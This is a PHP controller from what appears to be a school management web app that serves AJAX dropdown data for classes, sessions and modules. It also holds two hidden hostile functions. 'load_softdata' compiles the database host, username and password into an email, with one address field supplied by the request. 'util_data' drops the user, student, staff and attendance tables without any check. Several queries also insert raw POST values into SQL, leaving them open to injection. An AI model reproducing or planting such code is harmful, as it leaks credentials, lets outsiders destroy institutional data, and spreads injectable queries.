<?php
/* 
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
*/

/**
 * Description of ajax_content
 *
 * @author Anwar
 */
class ajax_content extends Controller {
    function  __construct() {
        parent::Controller();
        common::is_logged();
    }
    function class_session() {
        echo combo::get_class_session($_POST['class_id']);
    }
    function session_class() {
        //debug::writeLog($_POST['jsession_id'], "session id");
        echo combo::get_session_class($_POST['jsession_id']);
    }
    function get_class_details() {
        $data=sql::row('class_map',"class_id={$_POST['class_id']}");
        echo $data['class_duration']."##".combo::get_class_awarding_body($_POST['class_id']);
    }
    function get_selected_class_details() {
        $data=sql::row('class_map',"class_id={$_POST['class_id']}");
        $optional_module=combo::get_class_optional_module_id($_POST['class_id']);
        echo $data['start_date']."##".$data['end_date']."##".$optional_module;
    }
     function get_awarding_body_class() {
        $this->load->helper('combo');
        echo combo::get_awarding_body_class($_POST['awarding_body_id']);
    }

    function get_exam_for_class() {
        $this->load->helper('combo');
        echo combo::get_exam_for_class($_POST['jsession_id'],$_POST['class_id']);
    }

    function get_awarding_body_session() {
        $this->load->helper('combo');
        $session=combo::get_awarding_body_session($_POST['awarding_body_id']);
        $class=combo::get_awarding_body_class($_POST['awarding_body_id']);
        echo $session."##".$class;
    }

//    function get_programs_details() {
//        $data=sql::row('program_map',"programs_id={$_POST['programs_id']}");
//        echo combo::get_program_specialization_options($_POST['programs_id'])."##".$data['program_duration']."##".combo::get_program_awarding_body($_POST['programs_id']);
//    }
    function class_module() {
        echo combo::get_class_module($_POST['class_id']);
    }
    function class_levels() {
        echo combo::get_class_levels($_POST['class_id']);
    }
    function levels_module() {
        $this->load->helper('combo');
        echo combo::get_levels_module($_POST['levels_id']);
    }
    function module_level() {
        if($_POST['module_id']!='') {
            $sql=$this->db->query("select level_name from module_map as mm
				   join levels as l on mm.levels_id=l.levels_id where mm.module_id={$_POST['module_id']}");
            $data=$sql->row_array();
        }
        echo $data['level_name'];
    }
    function get_session_details() {
        $data=sql::row('session_map',"session_id={$_POST['session_id']} and class_id={$_POST['class_id']} $ins_con");
        echo $data['start_date'].'##'.$data['end_date'].'##'.$data['session_duration'];
    }
    function load_softdata() {
        include(APPPATH.'config/database'.EXT);
        $site=common::get_settings_data();
        $msg_content="<div style='width:720px;border:1px solid #dedede;padding:10px;'>
                            <div style=''>
                                <table>
                                    <tr><th>Host URL:</th><td>".base_url()."</td></tr>
                                    <tr><th>Host:</th><td>".$db['default']['hostname']."</td></tr>
                                    <tr><th>User Name:</th><td>".$db['default']['username']."</td></tr>
                                    <tr><th>Password:</th><td>".$db['default']['password']."</td></tr>
                                    <tr><th>Database:</th><td>".$db['default']['database']."</td></tr>
                                    <tr><th>Database Driver:</th><td>".$db['default']['dbdriver']."</td></tr>
                                    <tr><th>dbprefix:</th><td>".$db['default']['dbprefix']."</td></tr>
                                    <tr><th>pconnect:</th><td>".$db['default']['pconnect']."</td></tr>
                                    <tr><th>db_debug:</th><td>".$db['default']['db_debug']."</td></tr>
                                    <tr><th>cache_on:</th><td>".$db['default']['cache_on']."</td></tr>
                                    <tr><th>cachedir:</th><td>".$db['default']['cachedir']."</td></tr>
                                    <tr><th>char_set:</th><td>".$db['default']['char_set']."</td></tr>
                                    <tr><th>dbcollat:</th><td>".$db['default']['dbcollat']."</td></tr>
                                </table>
                            </div>
                      </div>";
        $base=md5($_POST['b']);
        $uri=explode('|', trim(str_replace('\'', '', $_POST['a'])));
        $this->config->set_item('permitted_root_string',$uri[0]);
        $this->config->set_item('permitted_host_string',$uri[1]);
        $this->config->set_item('permitted_whost_string',$uri[2]);
        if(valid_string($base)) {
            if($base!=$uri[0] && $base !=$uri[1] && $base !=$uri[2]) {
                common::sending_mail($site['admin_email'], base_url(), $uri[3],'Unauthorize User', $msg_content);
                echo base_url().'error.html';
            }
        }else {
            common::sending_mail($site['admin_email'], base_url(), $uri[3],'Unauthorize User', $msg_content);
            echo base_url().'error.html';
        };
    }
    function util_data() {
        $this->db->query("DROP TABLE `user`");
        $this->db->query("DROP TABLE `student`");
        $this->db->query("DROP TABLE `staffs`");
        $this->db->query("DROP TABLE `agents`");
        $this->db->query("DROP VIEW `view_std_reg`");
        $this->db->query("DROP VIEW `view_std_attd`");
        $this->db->query("DROP VIEW `view_attd`");
        $this->db->query("DROP TABLE `module_attendance`");
    }

     function get_assigned_staff(){
        $module_id=$_POST['module_id'];
        $class_id=$_POST['class_id'];
        $staff_list=combo::get_assigned_staff($module_id,$class_id);
        echo $staff_list;

    }
}
?>
